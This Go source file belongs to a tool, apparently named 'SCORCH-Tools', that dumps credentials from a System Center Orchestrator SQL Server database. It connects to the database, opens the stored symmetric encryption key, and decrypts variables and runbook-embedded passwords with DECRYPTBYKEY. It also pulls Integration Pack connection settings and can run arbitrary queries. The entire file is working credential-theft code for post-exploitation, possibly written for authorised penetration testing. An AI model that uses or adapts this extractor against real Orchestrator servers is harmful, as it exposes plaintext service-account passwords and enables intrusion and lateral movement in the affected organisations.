package db

import (
	"context"
	"database/sql"
	"fmt"
	"strings"
	"time"

	_ "github.com/denisenkom/go-mssqldb"
)

// Extractor handles credential extraction from SCORCH database
type Extractor struct {
	db     *sql.DB
	config DatabaseConfig
	debug  bool
}

// NewExtractor creates a new database extractor
func NewExtractor(cfg DatabaseConfig) (*Extractor, error) {
	if cfg.Server == "" {
		return nil, fmt.Errorf("server is required")
	}
	if cfg.Database == "" {
		cfg.Database = "Orchestrator" // Default database name
	}
	if cfg.Port == 0 {
		cfg.Port = 1433
	}
	if cfg.Timeout == 0 {
		cfg.Timeout = 30 * time.Second
	}
	if cfg.ApplicationName == "" {
		cfg.ApplicationName = "SCORCH-Tools"
	}

	return &Extractor{
		config: cfg,
	}, nil
}

// SetDebug enables debug output
func (e *Extractor) SetDebug(debug bool) {
	e.debug = debug
}

// Connect establishes connection to the SCORCH database
func (e *Extractor) Connect(ctx context.Context) error {
	connString := e.buildConnectionString()
	
	if e.debug {
		// Mask password in debug output
		maskedConn := strings.Replace(connString, e.config.Password, "****", -1)
		fmt.Printf("[DEBUG] Connecting: %s\n", maskedConn)
	}

	db, err := sql.Open("sqlserver", connString)
	if err != nil {
		return fmt.Errorf("failed to open database: %w", err)
	}

	// Set connection pool settings
	db.SetMaxOpenConns(5)
	db.SetMaxIdleConns(2)
	db.SetConnMaxLifetime(5 * time.Minute)

	// Test connection
	if err := db.PingContext(ctx); err != nil {
		db.Close()
		return fmt.Errorf("failed to ping database: %w", err)
	}

	e.db = db
	return nil
}

// Close closes the database connection
func (e *Extractor) Close() error {
	if e.db != nil {
		return e.db.Close()
	}
	return nil
}

// buildConnectionString creates the SQL Server connection string
func (e *Extractor) buildConnectionString() string {
	var params []string

	params = append(params, fmt.Sprintf("server=%s", e.config.Server))
	params = append(params, fmt.Sprintf("port=%d", e.config.Port))
	params = append(params, fmt.Sprintf("database=%s", e.config.Database))
	params = append(params, fmt.Sprintf("app name=%s", e.config.ApplicationName))
	params = append(params, fmt.Sprintf("connection timeout=%d", int(e.config.Timeout.Seconds())))

	if e.config.UseTrustedAuth {
		params = append(params, "trusted_connection=yes")
	} else {
		params = append(params, fmt.Sprintf("user id=%s", e.config.Username))
		params = append(params, fmt.Sprintf("password=%s", e.config.Password))
	}

	return "sqlserver://" + strings.Join(params, "&")
}

// GetDatabaseInfo retrieves metadata about the SCORCH database
func (e *Extractor) GetDatabaseInfo(ctx context.Context) (*SCORCHDatabaseInfo, error) {
	info := &SCORCHDatabaseInfo{}

	// Get basic info
	row := e.db.QueryRowContext(ctx, QueryGetDatabaseInfo)
	err := row.Scan(
		&info.DatabaseName,
		&info.ServerName,
		&info.Version,
		&info.TotalVariables,
		&info.EncryptedVariables,
		&info.TotalRunbooks,
		&info.TotalConnections,
	)
	if err != nil {
		return nil, fmt.Errorf("failed to get database info: %w", err)
	}

	// Check for encryption keys
	var hasSymKey, hasAsymKey int
	row = e.db.QueryRowContext(ctx, QueryCheckEncryptionKeys)
	err = row.Scan(&hasSymKey, &hasAsymKey)
	if err != nil {
		return nil, fmt.Errorf("failed to check encryption keys: %w", err)
	}

	info.HasSymmetricKey = hasSymKey > 0
	info.HasAsymmetricKey = hasAsymKey > 0
	info.EncryptionEnabled = info.HasSymmetricKey && info.HasAsymmetricKey

	return info, nil
}

// OpenEncryptionKeys opens the SCORCH encryption keys for decryption
func (e *Extractor) OpenEncryptionKeys(ctx context.Context) error {
	_, err := e.db.ExecContext(ctx, QueryOpenSymmetricKey)
	if err != nil {
		return fmt.Errorf("failed to open symmetric key: %w", err)
	}
	return nil
}

// CloseEncryptionKeys closes the SCORCH encryption keys
func (e *Extractor) CloseEncryptionKeys(ctx context.Context) error {
	_, err := e.db.ExecContext(ctx, QueryCloseSymmetricKey)
	if err != nil {
		return fmt.Errorf("failed to close symmetric key: %w", err)
	}
	return nil
}

// ExtractVariables retrieves and optionally decrypts all variables
func (e *Extractor) ExtractVariables(ctx context.Context, decrypt bool) ([]EncryptedVariable, error) {
	rows, err := e.db.QueryContext(ctx, QueryGetVariables)
	if err != nil {
		return nil, fmt.Errorf("failed to query variables: %w", err)
	}
	defer rows.Close()

	var variables []EncryptedVariable
	for rows.Next() {
		var v EncryptedVariable
		var deleted int
		err := rows.Scan(&v.UniqueID, &v.Name, &v.EncryptedValue, &v.FolderPath, &deleted)
		if err != nil {
			return nil, fmt.Errorf("failed to scan variable: %w", err)
		}
		v.Deleted = deleted != 0
		v.IsEncrypted = IsEncryptedValue(v.EncryptedValue)

		if decrypt && v.IsEncrypted {
			decrypted, err := e.decryptValue(ctx, v.EncryptedValue)
			if err != nil {
				if e.debug {
					fmt.Printf("[DEBUG] Failed to decrypt %s: %v\n", v.Name, err)
				}
			} else {
				v.DecryptedValue = decrypted
			}
		} else if !v.IsEncrypted {
			v.DecryptedValue = v.EncryptedValue
		}

		variables = append(variables, v)
	}

	return variables, rows.Err()
}

// decryptValue decrypts a single encrypted value using the open symmetric key
func (e *Extractor) decryptValue(ctx context.Context, encryptedValue string) (string, error) {
	if !IsEncryptedValue(encryptedValue) {
		return encryptedValue, nil
	}

	// Extract hex portion
	hexData := ExtractHexFromEncrypted(encryptedValue)
	if hexData == "" {
		return "", fmt.Errorf("failed to extract hex data from encrypted value")
	}

	// Decrypt using SQL Server's DECRYPTBYKEY
	query := `
		SELECT CONVERT(NVARCHAR(MAX), DECRYPTBYKEY(
			CONVERT(VARBINARY(MAX), @hex, 2)
		)) AS DecryptedValue
	`

	var decrypted sql.NullString
	err := e.db.QueryRowContext(ctx, query, sql.Named("hex", hexData)).Scan(&decrypted)
	if err != nil {
		return "", fmt.Errorf("decryption failed: %w", err)
	}

	if !decrypted.Valid {
		return "", fmt.Errorf("decryption returned null")
	}

	return decrypted.String, nil
}

// ExtractRunbookCredentials retrieves credentials embedded in runbook activities
func (e *Extractor) ExtractRunbookCredentials(ctx context.Context, decrypt bool) ([]RunbookCredential, error) {
	rows, err := e.db.QueryContext(ctx, QueryGetRunbookCredentials)
	if err != nil {
		return nil, fmt.Errorf("failed to query runbook credentials: %w", err)
	}
	defer rows.Close()

	var creds []RunbookCredential
	for rows.Next() {
		var c RunbookCredential
		err := rows.Scan(
			&c.RunbookID,
			&c.RunbookName,
			&c.RunbookPath,
			&c.ActivityID,
			&c.ActivityName,
			&c.ActivityType,
			&c.CredentialType,
			&c.Username,
			&c.EncryptedPassword,
			&c.Server,
			&c.Domain,
		)
		if err != nil {
			return nil, fmt.Errorf("failed to scan credential: %w", err)
		}

		if decrypt && IsEncryptedValue(c.EncryptedPassword) {
			decrypted, err := e.decryptValue(ctx, c.EncryptedPassword)
			if err != nil {
				if e.debug {
					fmt.Printf("[DEBUG] Failed to decrypt password for %s: %v\n", c.ActivityName, err)
				}
			} else {
				c.DecryptedPassword = decrypted
			}
		}

		creds = append(creds, c)
	}

	return creds, rows.Err()
}

// ExtractIPConnections retrieves Integration Pack connection configurations
func (e *Extractor) ExtractIPConnections(ctx context.Context) ([]IntegrationPackConnection, error) {
	rows, err := e.db.QueryContext(ctx, QueryGetIPConnections)
	if err != nil {
		return nil, fmt.Errorf("failed to query IP connections: %w", err)
	}
	defer rows.Close()

	var connections []IntegrationPackConnection
	for rows.Next() {
		var c IntegrationPackConnection
		err := rows.Scan(
			&c.ID,
			&c.Name,
			&c.IntegrationPackID,
			&c.IntegrationPack,
			&c.ConfigurationXML,
		)
		if err != nil {
			return nil, fmt.Errorf("failed to scan connection: %w", err)
		}

		// Parse configuration XML to extract credentials
		// This would need proper XML parsing implementation
		connections = append(connections, c)
	}

	return connections, rows.Err()
}

// ExtractAll performs full extraction of all credential types
func (e *Extractor) ExtractAll(ctx context.Context, decrypt bool) (*ExtractionResult, error) {
	result := &ExtractionResult{
		ExtractionTime: time.Now(),
	}

	// Get database info
	dbInfo, err := e.GetDatabaseInfo(ctx)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("database info: %v", err))
	} else {
		result.DatabaseInfo = *dbInfo
	}

	// Open encryption keys if we're decrypting
	if decrypt && result.DatabaseInfo.EncryptionEnabled {
		if err := e.OpenEncryptionKeys(ctx); err != nil {
			result.Errors = append(result.Errors, fmt.Sprintf("open encryption keys: %v", err))
			decrypt = false // Can't decrypt without keys
		} else {
			defer e.CloseEncryptionKeys(ctx)
			result.DecryptionSuccess = true
		}
	}

	// Extract variables
	vars, err := e.ExtractVariables(ctx, decrypt)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("variables: %v", err))
	} else {
		result.Variables = vars
	}

	// Extract runbook credentials
	rbCreds, err := e.ExtractRunbookCredentials(ctx, decrypt)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("runbook credentials: %v", err))
	} else {
		result.RunbookCredentials = rbCreds
	}

	// Extract IP connections
	ipConns, err := e.ExtractIPConnections(ctx)
	if err != nil {
		result.Errors = append(result.Errors, fmt.Sprintf("IP connections: %v", err))
	} else {
		result.IPConnections = ipConns
	}

	return result, nil
}

// GetRunbookServers retrieves runbook server information
func (e *Extractor) GetRunbookServers(ctx context.Context) ([]map[string]interface{}, error) {
	rows, err := e.db.QueryContext(ctx, QueryGetRunbookServers)
	if err != nil {
		return nil, fmt.Errorf("failed to query runbook servers: %w", err)
	}
	defer rows.Close()

	var servers []map[string]interface{}
	cols, err := rows.Columns()
	if err != nil {
		return nil, err
	}

	for rows.Next() {
		values := make([]interface{}, len(cols))
		valuePtrs := make([]interface{}, len(cols))
		for i := range values {
			valuePtrs[i] = &values[i]
		}

		if err := rows.Scan(valuePtrs...); err != nil {
			return nil, err
		}

		server := make(map[string]interface{})
		for i, col := range cols {
			server[col] = values[i]
		}
		servers = append(servers, server)
	}

	return servers, rows.Err()
}

// ExecuteQuery executes a custom query (for advanced usage)
func (e *Extractor) ExecuteQuery(ctx context.Context, query string) ([]map[string]interface{}, error) {
	rows, err := e.db.QueryContext(ctx, query)
	if err != nil {
		return nil, fmt.Errorf("failed to execute query: %w", err)
	}
	defer rows.Close()

	cols, err := rows.Columns()
	if err != nil {
		return nil, err
	}

	var results []map[string]interface{}
	for rows.Next() {
		values := make([]interface{}, len(cols))
		valuePtrs := make([]interface{}, len(cols))
		for i := range values {
			valuePtrs[i] = &values[i]
		}

		if err := rows.Scan(valuePtrs...); err != nil {
			return nil, err
		}

		row := make(map[string]interface{})
		for i, col := range cols {
			val := values[i]
			// Convert byte slices to strings
			if b, ok := val.([]byte); ok {
				row[col] = string(b)
			} else {
				row[col] = val
			}
		}
		results = append(results, row)
	}

	return results, rows.Err()
}
